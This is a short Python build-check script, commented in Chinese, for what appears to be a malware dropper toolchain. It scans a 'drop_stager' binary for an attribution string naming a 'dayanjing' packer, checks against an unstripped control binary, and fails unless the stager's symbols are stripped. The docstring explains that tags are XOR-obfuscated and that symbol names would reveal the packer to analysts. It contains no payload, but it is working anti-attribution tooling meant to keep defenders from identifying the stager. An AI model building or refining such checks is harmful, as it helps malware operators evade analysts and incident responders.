#!/usr/bin/env python3
"""25_deploy 归因特征自查。

为什么必须有对照组：
    只断言"stager 里没有归属串"是不够的。若扫描本身写错（大小写、转义、
    扫了源码而不是二进制），它会恒返回 0，于是"通过"只是假象 —— 真正的
    暴露被一个失效的检查掩盖住了。

    所以这里同时扫 drop_serve：它链接全量 PACKOBJ 且未 strip，必然命中。
        对照组不命中 -> 扫描器失效，实验组的 0 不可信，判失败
        实验组命中   -> 收窄/混淆未生效，判失败

为什么检查符号表：
    域分离标签已改为异或存放，但 pk_* / SHAPE_SALT 这些符号名本身也是特征
    —— 它们直接告诉分析者"这是 dayanjing 的 packer"。stager 不需要被调试，
    一律剥离。
"""

import subprocess
import sys

STAGER = "build/drop_stager"
SERVE = "build/drop_serve"
NEEDLE = b"dayanjing:packer"


def scan(path):
    """返回二进制中命中归属串的行数。"""
    out = subprocess.run(["strings", "-a", path], capture_output=True).stdout
    return sum(1 for line in out.split(b"\n") if NEEDLE in line)


def has_symbols(path):
    """nm 有输出即符号表还在。剥离后 nm 无输出且返回码非 0。"""
    r = subprocess.run(["nm", path], capture_output=True)
    return r.returncode == 0 and r.stdout.strip() != b""


def main():
    ctl = scan(SERVE)
    exp = scan(STAGER)
    sym = has_symbols(STAGER)

    print(f"[对照组] {SERVE}（全量链接、未 strip）归属串 = {ctl}")
    print(f"[实验组] {STAGER}（最小闭包 + strip）归属串 = {exp}")
    print(f"[符号表] {STAGER} 仍有符号 = {sym}")

    ok = True
    if ctl == 0:
        print("[FAIL] 对照组未命中：扫描器失效，实验组的 0 无意义")
        ok = False
    if exp != 0:
        print(f"[FAIL] 实验组命中 {exp} 处：收窄/混淆未生效")
        ok = False
    if sym:
        print("[FAIL] stager 符号表未剥离")
        ok = False

    print("=== attrib: PASS ===" if ok else "=== attrib: FAIL ===")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
